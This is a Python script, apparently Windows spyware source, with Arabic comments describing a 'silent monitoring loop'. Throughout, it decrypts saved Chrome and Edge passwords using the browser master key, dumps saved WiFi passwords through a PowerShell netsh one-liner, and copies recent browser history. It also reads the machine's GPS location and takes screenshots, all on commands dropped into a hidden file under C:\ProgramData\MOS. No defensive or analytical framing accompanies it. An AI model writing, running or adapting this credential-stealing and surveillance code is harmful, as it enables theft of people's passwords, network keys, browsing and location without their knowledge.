import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab

# إعدادات القناة الثابتة
BASE_DIR = r"C:\ProgramData\MOS"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")
SS_FILE = os.path.join(BASE_DIR, "ss.png")

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(buff, m_key):
    try:
        cipher = AES.new(m_key, AES.MODE_GCM, buff[3:15])
        return cipher.decrypt(buff[15:])[:-16].decode()
    except: return f"Hash: {base64.b64encode(buff).decode()}"

def run_passwords():
    out = ""
    user_p = os.path.expanduser('~')
    browsers = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data"}
    for name, path in browsers.items():
        db, st = path + r"\Default\Login Data", path + r"\Local State"
        if os.path.exists(db):
            out += f"\n--- {name} Passwords ---\n"
            try:
                m_key = get_master_key(st)
                tmp = os.path.join(os.environ["TEMP"], "tmp_p.db")
                shutil.copyfile(db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cur.fetchall():
                    if row[1].strip():
                        out += f"🌐 Site: {row[0]}\n📧 User: {row[1]}\n🔑 Pass: {decrypt_password(row[2], m_key)}\n---\n"
                conn.close(); os.remove(tmp)
            except Exception as e: out += f"Err {name}: {e}\n"
    return out or "No Passwords Found."

def run_wifi():
    try:
        # هذا الأمر يجلب كل الشبكات وكلمات السر دفعة واحدة
        cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'
        res = subprocess.check_output(["powershell", "-Command", cmd], text=True, encoding='cp850')
        return res if res.strip() else "No WiFi profiles found."
    except:
        return "⚠️ Error retrieving WiFi or No saved networks."

def run_history():
    out = ""
    user_p = os.path.expanduser('~')
    paths = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History"}
    for b, p in paths.items():
        if os.path.exists(p):
            out += f"--- {b} History ---\n"
            tmp = os.path.join(os.environ["TEMP"], "h_tmp")
            shutil.copyfile(p, tmp)
            try:
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                for r in cur.fetchall(): out += f"🔹 {r[0][:50]}\n🔗 {r[1]}\n\n"
                conn.close(); os.remove(tmp)
            except: pass
    return out

def run_gps():
    ps = "Add-Type -AssemblyName System.Device; $w = New-Object System.Device.Location.GeoCoordinateWatcher; $w.Start(); Start-Sleep -S 3; if($w.Status -eq 'Ready'){$pos=$w.Position.Location; 'LAT:'+$pos.Latitude+'|LON:'+$pos.Longitude}else{'ERROR'}"
    return subprocess.check_output(["powershell", "-Command", ps], text=True)

# حلقة المراقبة الصامتة
if not os.path.exists(BASE_DIR): os.makedirs(BASE_DIR)
while True:
    if os.path.exists(CMD_FILE):
        try:
            with open(CMD_FILE, "r") as f: cmd = f.read().strip()
            res = ""
            if cmd == "passwords": res = run_passwords()
            elif cmd == "wifi": res = run_wifi()
            elif cmd in ["history", "browser"]: res = run_history()
            elif cmd == "gps": res = run_gps()
            elif cmd == "screenshot":
                ImageGrab.grab().save(SS_FILE)
                res = "SCREENSHOT_DONE"
            
            with open(RES_FILE, "w", encoding="utf-8") as f: f.write(res)
            os.remove(CMD_FILE) # مسح الطلب بعد التنفيذ
        except: pass
    time.sleep(1)